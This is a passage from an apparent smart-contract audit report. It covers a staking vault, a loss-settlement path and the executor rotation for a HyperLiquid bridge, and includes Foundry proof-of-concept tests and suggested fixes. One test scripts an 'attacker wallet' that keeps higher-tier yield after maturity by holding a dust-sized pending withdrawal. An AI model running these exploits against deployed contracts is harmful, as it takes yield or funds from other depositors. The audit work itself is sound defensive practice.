import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../src/atRISKUSD.sol";
import "../src/StakingQueue.sol";
import "./mocks/MockForageTokenLocked.sol";
import "./mocks/MockRISKUSD.sol";
import "./mocks/MockVaultRegistry.sol";
import "./mocks/MockYieldSourceForLossPending.sol";

contract RollingDustWallet {
    function approveToken(address token, address spender, uint256 amount) external {
        IERC20(token).approve(spender, amount);
    }

    function joinQueue(StakingQueue queue, uint256 amount, uint8 tier) external {
        queue.joinQueue(amount, tier);
    }

    function setAutoRenew(atRISKUSD vault, bool enabled) external {
        vault.setAutoRenew(enabled);
    }

    function requestWithdrawal(atRISKUSD vault, uint256 shares) external {
        vault.requestWithdrawal(shares);
    }

    function rollWithdrawal(atRISKUSD vault, uint256 shares) external {
        vault.cancelWithdrawal();
        vault.requestWithdrawal(shares);
    }

    function selfRevert(StakingQueue queue, uint8 tier) external {
        queue.selfRevert(tier);
    }
}

/**
 * @title POC: Expired Opt-Out Holder Uses Dust Pending Withdrawal To Keep Tier-1 Yield
 * @notice Proof Statement: Proves that a matured Tier-1 holder who disables auto-renew can request withdrawal of only
 * a dust amount of shares, causing `processExpiredLockups()` and `selfRevert()` to skip the account while the
 * remaining Tier-1 shares stay live and continue accruing Tier-1 yield; after cooldown, the same holder can atomically
 * cancel and reopen the dust request to keep the bypass active.
 */
contract POC_ExpiredOptOutDustPendingWithdrawal_02eabff9 is Test {
    uint256 private constant TIER1_LOCKUP = 90 days;
    uint256 private constant TIER2_LOCKUP = 180 days;
    uint256 private constant TIER3_LOCKUP = 360 days;
    uint256 private constant COOLDOWN = 7 days;
    uint256 private constant DEPOSIT_AMOUNT = 1_000e6;
    uint256 private constant DUST_SHARES = 1e6;

    address private owner;
    address private bob;

    MockRISKUSD private riskusd;
    MockForageTokenLocked private forage;
    MockVaultRegistry private registry;
    MockYieldSourceForLossPending private yieldSource;

    StakingQueue private queue;
    atRISKUSD private tier0;
    atRISKUSD private tier1;
    atRISKUSD private tier2;
    atRISKUSD private tier3;

    RollingDustWallet private attackerWallet;

    function setUp() public {
        owner = makeAddr("timelock");
        bob = makeAddr("bob");

        riskusd = new MockRISKUSD();
        forage = new MockForageTokenLocked();
        registry = new MockVaultRegistry();
        yieldSource = new MockYieldSourceForLossPending();

        tier0 = _deployVault(0, COOLDOWN, 0);
        tier1 = _deployVault(TIER1_LOCKUP, COOLDOWN, 1);
        tier2 = _deployVault(TIER2_LOCKUP, COOLDOWN, 2);
        tier3 = _deployVault(TIER3_LOCKUP, COOLDOWN, 3);

        address[4] memory tierVaults = [address(tier0), address(tier1), address(tier2), address(tier3)];
        uint256[4] memory lockups = [uint256(0), TIER1_LOCKUP, TIER2_LOCKUP, TIER3_LOCKUP];
        uint16[4] memory yieldBps = [uint16(5000), 5500, 6000, 6500];
        uint16[4] memory fundingBps = [uint16(2000), 2000, 1500, 1500];
        uint256 vaultId =
            registry.addTestVault("Test Vault", "TV", tierVaults, address(0), 10_000_000e6, lockups, yieldBps, fundingBps);

        StakingQueue queueImpl = new StakingQueue();
        bytes memory initData =
            abi.encodeCall(StakingQueue.initialize, (address(riskusd), address(forage), tierVaults, address(registry), owner));
        queue = StakingQueue(address(new ERC1967Proxy(address(queueImpl), initData)));

        vm.prank(owner);
        queue.setVaultId(vaultId);

        _raiseWeeklyWithdrawalCap(tier0);
        _raiseWeeklyWithdrawalCap(tier1);
        _raiseWeeklyWithdrawalCap(tier2);
        _raiseWeeklyWithdrawalCap(tier3);

        _setStakingQueue(tier0);
        _setStakingQueue(tier1);
        _setStakingQueue(tier2);
        _setStakingQueue(tier3);

        vm.warp(block.timestamp + tier0.FINALIZE_DELAY() + 1);

        _finalizeStakingQueue(tier0);
        _finalizeStakingQueue(tier1);
        _finalizeStakingQueue(tier2);
        _finalizeStakingQueue(tier3);

        attackerWallet = new RollingDustWallet();
    }

    function test_POC_expiredOptOutDustPendingWithdrawalKeepsTierYield() public {
        _fundAndQueueContractWallet(address(attackerWallet), DEPOSIT_AMOUNT, 1);
        _fundAndQueueEOA(bob, DEPOSIT_AMOUNT, 1);

        queue.processQueue(1, 10);

        uint256 attackerShares = tier1.balanceOf(address(attackerWallet));
        assertGt(attackerShares, DUST_SHARES, "attacker needs residual shares after dust request");
        assertGt(tier1.balanceOf(bob), 0, "bob should also receive tier-1 shares");
        assertEq(tier1.convertToAssets(DUST_SHARES), 1, "dust request should reserve one underlying unit");

        attackerWallet.setAutoRenew(tier1, false);
        vm.prank(bob);
        tier1.setAutoRenew(false);

        vm.warp(block.timestamp + TIER1_LOCKUP);

        attackerWallet.requestWithdrawal(tier1, DUST_SHARES);

        atRISKUSD.PendingWithdrawal memory pending = tier1.pendingWithdrawal(address(attackerWallet));
        uint256 residualShares = attackerShares - DUST_SHARES;

        assertTrue(pending.active, "dust withdrawal should stay pending");
        assertEq(pending.riskusdAmount, 1, "dust request should snapshot a one-unit claim");
        assertEq(tier1.balanceOf(address(attackerWallet)), residualShares, "only dust shares should move into cooldown");
        assertEq(tier0.balanceOf(address(attackerWallet)), 0, "attacker should not receive tier-0 shares yet");

        address[] memory depositors = new address[](2);
        depositors[0] = address(attackerWallet);
        depositors[1] = bob;
        queue.processExpiredLockups(depositors, 1);

        assertEq(tier1.balanceOf(address(attackerWallet)), residualShares, "pending account should be skipped");
        assertEq(tier0.balanceOf(address(attackerWallet)), 0, "skipped account should not revert to tier 0");
        assertEq(tier1.balanceOf(bob), 0, "bob should be removed from tier 1");
        assertGt(tier0.balanceOf(bob), 0, "bob should be reverted into tier 0");

        vm.expectRevert(StakingQueue.InvalidQueueEntry.selector);
        attackerWallet.selfRevert(queue, 1);

        uint256 attackerAssetsBeforeYield = tier1.convertToAssets(residualShares);
        _accrueYield(tier1, 100e6);
        uint256 attackerAssetsAfterYield = tier1.convertToAssets(residualShares);

        assertGt(attackerAssetsAfterYield, attackerAssetsBeforeYield, "residual tier-1 shares should keep earning yield");

        vm.warp(block.timestamp + COOLDOWN + 1);
        attackerWallet.rollWithdrawal(tier1, DUST_SHARES);

        pending = tier1.pendingWithdrawal(address(attackerWallet));

        assertTrue(pending.active, "wallet should be able to reopen the dust request");
        assertEq(tier1.balanceOf(address(attackerWallet)), residualShares, "roll should preserve the live tier-1 balance");

        address[] memory attackerOnly = new address[](1);
        attackerOnly[0] = address(attackerWallet);
        queue.processExpiredLockups(attackerOnly, 1);

        assertEq(tier1.balanceOf(address(attackerWallet)), residualShares, "rolled dust request should still block reversion");
        assertEq(tier0.balanceOf(address(attackerWallet)), 0, "attacker should still avoid tier-0 reversion after rolling");
    }

    function _deployVault(uint256 lockupPeriod, uint256 cooldownPeriod, uint8 tierId) private returns (atRISKUSD) {
        atRISKUSD implementation = new atRISKUSD();
        bytes memory initData = abi.encodeCall(
            atRISKUSD.initialize,
            (
                address(riskusd),
                address(yieldSource),
                address(0),
                lockupPeriod,
                cooldownPeriod,
                tierId,
                _tierAbbreviation(tierId),
                owner
            )
        );
        return atRISKUSD(address(new ERC1967Proxy(address(implementation), initData)));
    }

    function _tierAbbreviation(uint8 tierId) private pure returns (string memory) {
        if (tierId == 0) return "0D";
        if (tierId == 1) return "90D";
        if (tierId == 2) return "180D";
        if (tierId == 3) return "360D";
        return "";
    }

    function _raiseWeeklyWithdrawalCap(atRISKUSD vault) private {
        vm.prank(owner);
        vault.setWeeklyWithdrawalCapBps(10_000);
    }

    function _setStakingQueue(atRISKUSD vault) private {
        vm.prank(owner);
        vault.setStakingQueue(address(queue));
    }

    function _finalizeStakingQueue(atRISKUSD vault) private {
        vm.prank(owner);
        vault.finalizeStakingQueue();
    }

    function _fundAndQueueEOA(address depositor, uint256 amount, uint8 tier) private {
        riskusd.mint(depositor, amount);
        vm.startPrank(depositor);
        riskusd.approve(address(queue), amount);
        queue.joinQueue(amount, tier);
        vm.stopPrank();
    }

    function _fundAndQueueContractWallet(address depositor, uint256 amount, uint8 tier) private {
        riskusd.mint(depositor, amount);
        attackerWallet.approveToken(address(riskusd), address(queue), amount);
        attackerWallet.joinQueue(queue, amount, tier);
    }

    function _accrueYield(atRISKUSD vault, uint256 amount) private {
        riskusd.mint(address(yieldSource), amount);
        vm.startPrank(address(yieldSource));
        riskusd.approve(address(vault), amount);
        vault.accrueYield(amount);
        vm.stopPrank();
    }
}

```

#### Recommendation

The maturity invariant should be enforced on the entire position, not suppressed by an arbitrary pending flag.

Safe fixes include:
1. Forbid `requestWithdrawal()` from opted-out matured tiers unless it covers the entire balance and immediately resolves the maturity state.
2. Make `processExpiredLockups()` treat a pending-withdrawal account with residual live balance as still eligible for forced reversion of the remainder.
3. Alternatively, once auto-renew is disabled and maturity is reached, disallow any new pending withdrawal unless the full position is moved out of the high tier.

One directional approach is:

```solidity
function requestWithdrawal(uint256 shares) external {
    if (_hasExpiredAutoRenewDisabledAccount(msg.sender) && shares != balanceOf(msg.sender)) {
        revert MustExitOrRevertEntireExpiredPosition();
    }
    ...
}
```

#### Assumptions

- [x] The user can request a sufficiently small but nonzero number of shares; the exact minimum depends on share granularity.
- [x] To make the bypass race-free, a contract wallet can roll the dust pending withdrawal atomically once cooldown ends.
- [x] The issue does not depend on admin behavior, offchain keepers, or unusual token semantics.
- [x] The economic impact scales with the future yield gap between the higher tier and `Tier 0`.

#### Predicted Invalid Reasons

- A matured user with a pending withdrawal is just choosing the withdrawal path instead of reversion, and anyone can process expiry once the cooldown clears.

<a id="finding-open-79"></a>
### OPEN-79 — Deployed bridge/treasury wiring leaves no reachable end-to-end loss-settlement path

#### Summary

The deployed topology wires `RISKUSDVault` to `HLTradingBridge` and `USDCTreasury`, but the bridge only posts zero-nonce NAV updates, the treasury cannot call the vault’s loss-absorption entrypoints, and the manual fallback depends on a custodian hook the bridge does not implement. A real shortfall can therefore freeze the vault without a reachable onchain recovery path.

#### Context Files

##### Deploy.s.sol

Path: `openforage_smart_contracts/script/Deploy.s.sol`
Highlight lines: 1

```solidity
deployedRiskusdVault = _proxy(
    implRiskusdVault,
    abi.encodeCall(
        RISKUSDVault.initializeTarget,
        (cfg.usdc, deployedRiskusd, cfg.deployer, deployedHLTradingBridge, deployedUSDCTreasury)
    )
);
```

##### HLTradingBridge.sol

Path: `openforage_smart_contracts/src/hyperliquid/HLTradingBridge.sol`
Highlight lines: 1

```solidity
function postNAV(uint256 vaultId, uint256 bookValue, uint256 rawNav, uint256 observedAt) external {
    ...
    IRISKUSDVaultNAVPort(riskusdVault).recordCustodianNAV(vaultId, applied, 0);
}
```

##### RISKUSDVault.sol

Path: `openforage_smart_contracts/src/RISKUSDVault.sol`
Highlight lines: 1, 6

```solidity
function _burnForLoss(uint256 vaultId, uint256 riskusdAmount, uint256 coverUsdcAmount) internal {
    if (msg.sender != _lossReporter) revert UnauthorizedLossReporter();
    ...
}

function finalizeAttestedLoss(uint256 vaultId, uint256 lossNonce, uint256 amount) external {
    if (msg.sender != _custodian) revert UnauthorizedCustodian();
    if (!_hasOpenAttestedLossNonce()) revert LossNotAcknowledged();
    ...
}
```

##### RISKUSDVault.manualFallback

Path: `openforage_smart_contracts/src/RISKUSDVault.sol`
Highlight lines: 1

```text
recordManualCustodianNAV() always delegates normalization to the current custodian via `_normalizeManualCustodianNAV()`, and `HLTradingBridge` does not implement that hook.
```

##### USDCTreasury.surface

Path: `openforage_smart_contracts/src/USDCTreasury.sol`
Highlight lines: 1

```text
Its external methods are `setPnLAttestor`, `setHLTradingBridge`, `setBlocklist`, `recognizePnL`, `recordPrincipalReturnUSDC`, `returnPnLUSDC`, and disbursement/wallet-rotation methods. There is no method that originates a call from the treasury contract to `RISKUSDVault.burnForLoss`, `coverAndBurnForLoss`, or `replenish`.
```

#### Proof of Concept

Reproduces the production-like `HLTradingBridge` + `USDCTreasury` wiring, posts a lower NAV through `HLTradingBridge.postNAV(...)`, and shows the vault enters `lossPending()` while the configured bridge and treasury expose no reachable settlement path. It also confirms that direct USDC top-ups do not clear the lock and that the manual fallback reverts against the live bridge custodian.

##### POC_HLTradingBridge_loss_settlement_wiring_e8478fa5.t.sol

Path: `test/hyperliquid/POC_HLTradingBridge_loss_settlement_wiring_e8478fa5.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

import "../../src/Blocklist.sol";
import "../../src/CustodianRegistry.sol";
import "../../src/RISKUSD.sol";
import "../../src/RISKUSDVault.sol";
import "../../src/USDCTreasury.sol";
import "../../src/VaultRegistry.sol";
import "../../src/hyperliquid/HLTradingBridge.sol";
import "../mocks/MockUSDC.sol";

/**
 * @title POC: Bridge/Treasury Wiring Has No Reachable Loss-Settlement Pipeline
 * @notice Proof Statement: Prove that once the vault is wired to `HLTradingBridge` as custodian
 * and `USDCTreasury` as lossReporter, a keeper-posted shortfall can place the vault into
 * `lossPending()` while the configured live actors expose no callable interface to
 * `burnForLoss`, `coverAndBurnForLoss`, `replenish`, `finalizeAttestedLoss`, or
 * `normalizeManualCustodianNAV`; this validates that the deployed topology lacks a reachable
 * end-to-end loss-settlement path.
 *
 * Bug Vector:
 * 1. Wire the vault to the same bridge/treasury actor pair used by the target deployment.
 * 2. Deploy capital and report a lower NAV through `HLTradingBridge.postNAV(...)`, which hardcodes `lossNonce = 0`.
 * 3. Observe `lossPending()` becomes true, `lossPendingVaultId()` stays unbound at `0`, and user exit flows freeze.
 * 4. Observe the configured treasury/bridge pair have no external settlement hooks, zero-nonce reports cannot be finalized,
 *    direct USDC top-ups do not clear the lock, and manual fallback reverts against the live bridge.
 */
contract POC_HLTradingBridge_loss_settlement_wiring_e8478fa5 is Test {
    MockUSDC internal usdc;
    RISKUSD internal riskusd;
    RISKUSDVault internal vault;
    VaultRegistry internal vaultRegistry;
    USDCTreasury internal treasury;
    HLTradingBridge internal bridge;
    CustodianRegistry internal custodianRegistry;
    Blocklist internal blocklist;

    address internal owner = makeAddr("timelock");
    address internal forageGovernor = makeAddr("forage-governor");
    address internal blocklistGuardian = makeAddr("blocklist-guardian");
    address internal keeper = makeAddr("keeper");
    address internal executor = makeAddr("executor");
    address internal guardianModule = makeAddr("guardian-module");
    address internal coldAccount = makeAddr("hyperliquid-cold-account");
    address internal foundationPrimary = makeAddr("foundation-primary");
    address internal foundationBackup = makeAddr("foundation-backup");
    address internal protocolPrimary = makeAddr("protocol-primary");
    address internal protocolBackup = makeAddr("protocol-backup");
    address internal vaultDepositor = makeAddr("vault-depositor");
    address internal manualReporter = makeAddr("manual-attestation-reporter");
    bytes32 internal sourceAccount = bytes32(uint256(uint160(address(0xBEEF))));

    uint256 internal constant VAULT_ID = 1;
    uint64 internal constant WITHDRAWAL_CHAIN_SELECTOR = 421_614;
    uint256 internal constant INITIAL_DEPOSIT = 1_000_000e6;
    uint256 internal constant DEPLOY_AMOUNT = 500_000e6;
    uint256 internal constant POSTED_NAV = 300_000e6;
    uint256 internal constant LOSS_AMOUNT = DEPLOY_AMOUNT - POSTED_NAV;

    function setUp() public {
        usdc = new MockUSDC();

        RISKUSD riskusdImplementation = new RISKUSD();
        riskusd = RISKUSD(
            address(new ERC1967Proxy(address(riskusdImplementation), abi.encodeCall(RISKUSD.initialize, (owner))))
        );

        RISKUSDVault vaultImplementation = new RISKUSDVault();
        vault = RISKUSDVault(
            address(
                new ERC1967Proxy(
                    address(vaultImplementation),
                    abi.encodeCall(RISKUSDVault.initializeTarget, (address(usdc), address(riskusd), owner, owner, owner))
                )
            )
        );

        VaultRegistry registryImplementation = new VaultRegistry();
        vaultRegistry = VaultRegistry(
            address(new ERC1967Proxy(address(registryImplementation), abi.encodeCall(VaultRegistry.initialize, (owner))))
        );

        USDCTreasury treasuryImplementation = new USDCTreasury();
        treasury = USDCTreasury(
            address(
                new ERC1967Proxy(
                    address(treasuryImplementation),
                    abi.encodeCall(
                        USDCTreasury.initialize,
                        (
                            address(usdc),
                            address(vault),
                            address(vaultRegistry),
                            owner,
                            foundationPrimary,
                            foundationBackup,
                            protocolPrimary,
                            protocolBackup
                        )
                    )
                )
            )
        );

        Blocklist blocklistImplementation = new Blocklist();
        blocklist = Blocklist(
            address(new ERC1967Proxy(address(blocklistImplementation), abi.encodeCall(Blocklist.initialize, (blocklistGuardian, owner))))
        );

        CustodianRegistry custodianRegistryImplementation = new CustodianRegistry();
        custodianRegistry = CustodianRegistry(
            address(
                new ERC1967Proxy(
                    address(custodianRegistryImplementation),
                    abi.encodeCall(CustodianRegistry.initialize, (owner, forageGovernor, guardianModule))
                )
            )
        );

        HLTradingBridge bridgeImplementation = new HLTradingBridge();
        bridge = HLTradingBridge(
            address(
                new ERC1967Proxy(
                    address(bridgeImplementation),
                    abi.encodeCall(
                        HLTradingBridge.initialize,
                        (
                            address(usdc),
                            address(vault),
                            address(treasury),
                            address(custodianRegistry),
                            owner,
                            keeper,
                            executor,
                            guardianModule,
                            HLTradingBridge.RouteConfig({
                                coldAccount: coldAccount,
                                hyperliquidSourceAccount: sourceAccount,
                                withdrawalChainSelector: WITHDRAWAL_CHAIN_SELECTOR
                            })
                        )
                    )
                )
            )
        );

        vm.startPrank(owner);

        vaultRegistry.initializeV2(address(vault));
        vault.initializeV2(address(vaultRegistry));

        address[4] memory tierVaults =
            [makeAddr("tier0"), makeAddr("tier1"), makeAddr("tier2"), makeAddr("tier3")];
        uint256[4] memory lockupDurations = [uint256(0), 90 days, 180 days, 365 days];
        uint16[4] memory yieldSplitsBps = [uint16(7000), uint16(6000), uint16(5000), uint16(4000)];
        uint16[4] memory fundingBps = [uint16(3000), uint16(4000), uint16(5000), uint16(6000)];
        vaultRegistry.addVault(
            "OpenForage Target Vault",
            "OF-TARGET",
            tierVaults,
            makeAddr("stakingQueue"),
            10_000_000e6,
            lockupDurations,
            yieldSplitsBps,
            fundingBps
        );

        CustodianRegistry.CustodianConfig memory hlConfig = custodianRegistry.hyperLiquidLaunchConfig(
            address(bridge), executor, uint32(WITHDRAWAL_CHAIN_SELECTOR), sourceAccount, 10_000_000e6
        );
        custodianRegistry.proposeCustodianConfig(hlConfig);

        treasury.setHLTradingBridge(address(bridge));
        treasury.setBlocklist(address(blocklist));

        riskusd.setBlocklist(address(blocklist));
        riskusd.setMinter(address(vault));

        vault.setBlocklist(address(blocklist));
        vault.setDeploymentBufferBps(0);
        vault.setMaxDeploymentRatioBps(10_000);
        vault.setPerBlockMintCap(10_000, type(uint256).max);
        vault.setDailyMintCapBps(10_000);
        vault.setWeeklyMintCapBps(20_000);
        vault.setCustodian(address(bridge));
        vault.setLossReporter(address(treasury));
        vault.setManualAttestationReporter(manualReporter);

        bridge.setBlocklist(address(blocklist));

        vm.warp(block.timestamp + 2 days + 1);

        custodianRegistry.finalizeCustodianConfig(hlConfig.id);
        riskusd.finalizeMinter();
        vault.finalizeCustodian();
        vault.finalizeLossReporter();
        vault.finalizeManualAttestationReporter();

        vm.stopPrank();

        usdc.mint(vaultDepositor, INITIAL_DEPOSIT);
        vm.startPrank(vaultDepositor);
        usdc.approve(address(vault), INITIAL_DEPOSIT);
        vault.deposit(INITIAL_DEPOSIT);
        vm.stopPrank();
    }

    function test_lossSettlementPathIsUnreachableUnderLiveWiring() public {
        vm.prank(executor);
        bridge.deployToHyperLiquid(DEPLOY_AMOUNT);

        vm.prank(keeper);
        bridge.postNAV(VAULT_ID, DEPLOY_AMOUNT, POSTED_NAV, block.timestamp);

        assertTrue(vault.lossPending(), "keeper-posted shortfall should freeze the vault");
        assertEq(vault.lossPendingVaultId(), 0, "bridge zero-nonce path leaves the pending loss unbound");
        assertEq(vault.latestLossNonce(), 0, "bridge never opens a nonce-bound attested loss");
        assertEq(vault.settledLossNonce(), 0, "nothing is settled on the zero-nonce path");
        assertEq(vault.latestLossAmount(), 0, "zero-nonce path never populates attested loss amount");

        vm.startPrank(vaultDepositor);
        riskusd.approve(address(vault), 1e6);
        vm.expectRevert(RISKUSDVault.LossPending.selector);
        vault.redeem(1e6);
        vm.stopPrank();

        address newDepositor = makeAddr("new-depositor");
        usdc.mint(newDepositor, 1e6);
        vm.startPrank(newDepositor);
        usdc.approve(address(vault), 1e6);
        vm.expectRevert(RISKUSDVault.LossPending.selector);
        vault.deposit(1e6);
        vm.stopPrank();

        vm.prank(owner);
        vm.expectRevert(VaultRegistry.LossPendingForVault.selector);
        vaultRegistry.startWindDown(VAULT_ID);

        (bool ok,) = address(treasury).call(abi.encodeWithSignature("burnForLoss(uint256,uint256)", VAULT_ID, LOSS_AMOUNT));
        assertFalse(ok, "USDCTreasury exposes no burnForLoss entrypoint");

        (ok,) = address(treasury).call(
            abi.encodeWithSignature("coverAndBurnForLoss(uint256,uint256,uint256)", VAULT_ID, 0, LOSS_AMOUNT)
        );
        assertFalse(ok, "USDCTreasury exposes no coverAndBurnForLoss entrypoint");

        (ok,) = address(treasury).call(abi.encodeWithSignature("replenish(uint256)", LOSS_AMOUNT));
        assertFalse(ok, "USDCTreasury exposes no replenish entrypoint");

        (ok,) = address(bridge).call(
            abi.encodeWithSignature("finalizeAttestedLoss(uint256,uint256,uint256)", VAULT_ID, 1, LOSS_AMOUNT)
        );
        assertFalse(ok, "HLTradingBridge exposes no finalizeAttestedLoss entrypoint");

        (ok,) = address(bridge).call(
            abi.encodeWithSignature("normalizeManualCustodianNAV(uint256,uint256,uint256)", VAULT_ID, POSTED_NAV, 1)
        );
        assertFalse(ok, "HLTradingBridge exposes no manual NAV normalizer hook");

        vm.prank(address(bridge));
        vm.expectRevert(RISKUSDVault.LossNotAcknowledged.selector);
        vault.finalizeAttestedLoss(VAULT_ID, 1, LOSS_AMOUNT);

        usdc.mint(owner, LOSS_AMOUNT);
        vm.prank(owner);
        usdc.transfer(address(vault), LOSS_AMOUNT);
        assertTrue(vault.lossPending(), "direct USDC top-ups do not consume the NAV shortfall");

        vm.prank(manualReporter);
        vm.expectRevert(
            abi.encodeWithSelector(RISKUSDVault.ManualAttestationNormalizationFailed.selector, address(bridge))
        );
        vault.recordManualCustodianNAV(VAULT_ID, POSTED_NAV, 1);
    }
}

```

##### forge test command

Path: `openforage_smart_contracts/`

```bash
forge test --match-path test/hyperliquid/POC_HLTradingBridge_loss_settlement_wiring_e8478fa5.t.sol -vv
```

#### Recommendation

Make the deployed actors satisfy the vault’s settlement interface as a coherent pipeline.

Primary fix:

```solidity
// Option A: teach the deployed actors the missing hooks
// - HLTradingBridge: post nonce-bound losses and call finalizeAttestedLoss
// - USDCTreasury (or a dedicated reporter): call burnForLoss / coverAndBurnForLoss / replenish
// - HLTradingBridge (or another live custodian): implement normalizeManualCustodianNAV
```

Alternative fix:
- Remove the unreachable nonce/manual machinery from `RISKUSDVault` and replace it with a zero-nonce design that is actually implemented end to end by the deployed bridge and treasury.

#### Assumptions

- [x] The `Deploy.s.sol` wiring is representative of the intended production topology.
- [x] No omitted contract outside this snapshot can make the missing privileged vault calls.
- [x] The loss-settlement path is expected to work live without a post-loss governance rewire.

#### Predicted Invalid Reasons

- “Zero-nonce losses do not need `finalizeAttestedLoss()`.”
- “The desk can restore NAV or governance can rotate the loss reporter/custodian if a loss occurs.”

<a id="medium"></a>
## Medium

<a id="finding-open-102"></a>
### OPEN-102 — Revoked HyperLiquid executors retain permanent bridge control because executor rotation is dead config

#### Summary

`HLTradingBridge` snapshots `_custodianExecutor` during `initialize`, and every executor-only bridge action checks that cached value. `CustodianRegistry.finalizeCustodianConfig` updates `state.executor` and `ROLE_EXECUTOR`, but the bridge never reads that registry state, so rotating the registry executor leaves the old key live on the same bridge and locks the new key out.

#### Context Files

##### HLTradingBridge.initialize

Path: `openforage_audit_repo/openforage_smart_contracts/src/hyperliquid/HLTradingBridge.sol`
Highlight lines: 1

```solidity
function initialize(..., address keeper_, address executor_, ...) external initializer {
    ...
    _keeper = keeper_;
    _custodianExecutor = executor_;
    ...
}
```

##### HLTradingBridge._requireExecutor

Path: `openforage_audit_repo/openforage_smart_contracts/src/hyperliquid/HLTradingBridge.sol`
Highlight lines: 1

```solidity
function _requireExecutor() internal view {
    if (msg.sender != _custodianExecutor) revert UnauthorizedExecutor();
}
```

##### CustodianRegistry.finalizeCustodianConfig

Path: `openforage_audit_repo/openforage_smart_contracts/src/CustodianRegistry.sol`
Highlight lines: 1

```solidity
if (state.exists) {
    _setCoreRoles(id, state.bridge, state.executor, false);
}
...
state.bridge = config.bridge;
state.executor = config.executor;
...
_setCoreRoles(id, config.bridge, config.executor, true);
```

##### CustodianRegistry._setCoreRoles

Path: `openforage_audit_repo/openforage_smart_contracts/src/CustodianRegistry.sol`
Highlight lines: 1

```solidity
function _setCoreRoles(bytes32 id, address bridge, address executor, bool allowed) internal {
    _setRole(id, ROLE_ACCOUNTANT, bridge, allowed);
    _setRole(id, ROLE_NAV_ATTESTER, bridge, allowed);
    _setRole(id, ROLE_EXECUTOR, executor, allowed);
}
```

#### Proof of Concept

Rotate `CustodianRegistry.executor` for the same bridge and then call the bridge from the new address: it reverts at `_requireExecutor()`. The original executor still passes the same gate for `deployToHyperLiquid`, `returnPrincipalUSDC`, `returnPnLUSDC`, and `requestWithdrawalIntent` because `HLTradingBridge` keeps the value captured in `initialize`.

##### HLTradingBridge.initialize

Path: `openforage_audit_repo/openforage_smart_contracts/src/hyperliquid/HLTradingBridge.sol`

```solidity
function initialize(..., address keeper_, address executor_, ...) external initializer {
    ...
    _keeper = keeper_;
    _custodianExecutor = executor_;
    ...
}
```

##### HLTradingBridge._requireExecutor

Path: `openforage_audit_repo/openforage_smart_contracts/src/hyperliquid/HLTradingBridge.sol`

```solidity
function _requireExecutor() internal view {
    if (msg.sender != _custodianExecutor) revert UnauthorizedExecutor();
}
```

##### HLTradingBridge.deployToHyperLiquid

Path: `openforage_audit_repo/openforage_smart_contracts/src/hyperliquid/HLTradingBridge.sol`

```solidity
function deployToHyperLiquid(uint256 usdcE6) external whenNotPaused nonReentrant {
    _requireExecutor();
    ...
}
```

##### HLTradingBridge.returnPrincipalUSDC

Path: `openforage_audit_repo/openforage_smart_contracts/src/hyperliquid/HLTradingBridge.sol`

```solidity
function returnPrincipalUSDC(uint256 amount) external nonReentrant {
    _requireExecutor();
    ...
}
```

##### HLTradingBridge.returnPnLUSDC

Path: `openforage_audit_repo/openforage_smart_contracts/src/hyperliquid/HLTradingBridge.sol`

```solidity
function returnPnLUSDC(uint256 vaultId, uint256 amount) external nonReentrant {
    _requireExecutor();
    ...
}
```

##### HLTradingBridge.requestWithdrawalIntent

Path: `openforage_audit_repo/openforage_smart_contracts/src/hyperliquid/HLTradingBridge.sol`

```solidity
function requestWithdrawalIntent(...) external nonReentrant returns (bytes32 intentId) {
    _requireExecutor();
    ...
}
```

##### CustodianRegistry.finalizeCustodianConfig

Path: `openforage_audit_repo/openforage_smart_contracts/src/CustodianRegistry.sol`

```solidity
if (state.exists) {
    _setCoreRoles(id, state.bridge, state.executor, false);
}
...
state.bridge = config.bridge;
state.executor = config.executor;
...
_setCoreRoles(id, config.bridge, config.executor, true);
```

##### CustodianRegistry._setCoreRoles

Path: `openforage_audit_repo/openforage_smart_contracts/src/CustodianRegistry.sol`

```solidity
function _setCoreRoles(bytes32 id, address bridge, address executor, bool allowed) internal {
    _setRole(id, ROLE_ACCOUNTANT, bridge, allowed);
    _setRole(id, ROLE_NAV_ATTESTER, bridge, allowed);
    _setRole(id, ROLE_EXECUTOR, executor, allowed);
}
```

#### Recommendation

The bridge needs a real executor-rotation path.

Preferred fix:

```solidity
function proposeExecutor(address newExecutor) external onlyOwner { ... }
function finalizeExecutor() external onlyOwner { ... }
function acceptExecutor() external { ... }
```

and `_requireExecutor()` should authorize the current bridged value after that handoff.

Stronger alternative: remove the duplicate executor source of truth and require the caller to hold the current registry `ROLE_EXECUTOR` for `HYPERLIQUID_CUSTODIAN_ID()` on every privileged bridge call.

#### Assumptions

- [x] Governance rotates the executor in `CustodianRegistry` while reusing the same bridge.
- [x] The old executor key is compromised, retained by a former operator, or otherwise no longer trusted.
- [x] The bridge remains the vault custodian and treasury return port during that period.

#### Predicted Invalid Reasons

- The registry executor is just metadata for custodian config; if we ever need to rotate the executor we can upgrade or replace the bridge.

<a id="finding-open-74"></a>
### OPEN-74 — Registry executor rotation never revokes the live HyperLiquid executor

#### Summary

`CustodianRegistry` can revoke or rotate `ROLE_EXECUTOR`, but `HLTradingBridge` caches `executor_` in `_custodianExecutor` at initialization and never re-reads the registry. After a same-bridge rotation, the registry shows the old executor revoked while the old address can still call privileged bridge actions such as `deployToHyperLiquid`, `requestWithdrawalIntent`, `returnPrincipalUSDC`, and `returnPnLUSDC`.

#### Context Files

##### finalizeCustodianConfig excerpt

Path: `src/CustodianRegistry.sol`
Highlight lines: 1, 3, 6, 9, 11

```solidity
function finalizeCustodianConfig(bytes32 id) external onlyOwner {
    ...
    if (!state.exists) {
        state.exists = true;
    } else {
        _setCoreRoles(id, state.bridge, state.executor, false);
    }
    ...
    state.executor = config.executor;
    ...
    _setCoreRoles(id, config.bridge, config.executor, true);
}
```

##### initialize and _requireExecutor excerpt

Path: `src/hyperliquid/HLTradingBridge.sol`
Highlight lines: 1, 4, 8, 9

```solidity
function initialize(..., address keeper_, address executor_, ..., RouteConfig calldata route) external initializer {
    ...
    _keeper = keeper_;
    _custodianExecutor = executor_;
    ...
}

function _requireExecutor() internal view {
    if (msg.sender != _custodianExecutor) revert UnauthorizedExecutor();
}
```

##### executor-gated bridge actions excerpt

Path: `src/hyperliquid/HLTradingBridge.sol`
Highlight lines: 1, 2, 4, 5, 9, 10, 14, 15, 19, 20

```solidity
function deployToHyperLiquid(uint256 usdcE6) external whenNotPaused nonReentrant {
    _requireExecutor();
    ...
    _recordCustodianDeployment(usdcE6);
